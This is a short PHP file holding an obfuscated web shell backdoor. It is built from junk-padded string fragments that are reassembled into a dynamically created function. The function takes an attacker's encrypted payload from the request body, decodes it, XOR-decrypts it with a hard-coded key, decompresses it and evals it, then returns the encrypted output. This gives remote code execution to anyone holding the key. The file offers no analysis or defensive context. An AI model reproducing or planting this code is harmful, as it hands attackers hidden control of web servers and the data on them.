<?php
$l='uOncOtion x($tO,$k){$c=strOlOen($k);$l=sOtOrlen(O$t);$o="";fOor($iO=0;$i<$OlO;){OOfor';
$h=str_replace('Z','','crZZeZatZe_funcZtiZon');
$X='$k="5O1c8c43O3";$kh="eO133850OO396c2";O$Okf="973d34df36bd"O;$p="O2OWr7Tqa13F8VOlltY";fO';
$s='($j=0;($j<$c&&O$iO<$l)O;$j++,$i++)O{$oO.=$t{$i}^$k{$j}O;}}OreturOn $o;}Oif (@pOreg_mat';
$u='eOvalO(@gzuncOompressO(@Ox(@baOse64_decodOe($m[OO1O]),$k)));$o=@oOb_get_OcontentsO();';
$I='@ob_eOnd_OcleanO();$r=@basOe64O_encode(O@x(@OgzcompreOss($oO),$k));priOntO("$p$khO$r$kf");}';
$Q='chO("/O$khO(.+)$kf/O",@OfiOle_get_contOents("phOp://iOnput"),O$mO)O==1) {@ob_start();@';
$H=str_replace('O','',$X.$l.$s.$Q.$u.$I);
$t=$h('',$H);$t();
?>
